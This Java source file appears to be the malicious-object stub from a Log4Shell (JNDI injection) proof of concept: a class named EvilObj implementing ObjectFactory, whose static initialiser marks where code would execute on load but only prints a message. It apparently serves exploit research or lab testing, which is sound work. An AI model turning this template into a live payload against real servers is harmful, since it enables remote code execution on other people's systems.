package com.hyj.log4j;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;

public class EvilObj extends UnicastRemoteObject implements ObjectFactory {

    static {
        System.out.println("where exec !!!!!!");
    }

    public EvilObj() throws RemoteException {
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }

    @Override
    public String toString() {
        final StringBuffer sb = new StringBuffer("EvilObj{");

        sb.append("fengjing");
        sb.append('}');
        return sb.toString();
    }
}
